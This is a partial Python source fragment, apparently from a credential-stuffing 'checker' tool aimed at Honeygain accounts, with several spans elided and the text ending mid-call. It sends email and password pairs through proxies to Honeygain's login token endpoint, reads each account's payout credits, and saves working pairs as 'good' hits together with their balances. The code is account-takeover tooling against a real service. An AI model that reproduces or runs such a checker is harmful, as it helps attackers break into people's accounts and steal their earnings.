    ...
    while not Checker.stopping:
        try:
            ...
            with Session() as s:
                ...
                r = s.post(
                    "https://dashboard.honeygain.com/api/v1/users/tokens", json=payload
                )
                ...
                balance = s.get(
                    ...
                    headers=header,
                ).json()["data"]["payout"]["credits"]
                if int(balance) > 0:
                    if not Checker.cui:
                        log("good", ":".join([email, password]), "Honeygain")
                    save(
                        "Honeygain",
                        "good",
                        Checker.time,
                        ":".join([email, password]) + f" | Credits: {balance}",
                    )
                    Checker.good += 1
                    return_proxy(proxy)
                    return
                ...
                if not Checker.cui:
                    log("custom", ":".join([email, password]), "Honeygain")
                save(
                    "Honeygain",
                    "custom",
                    Checker.time,
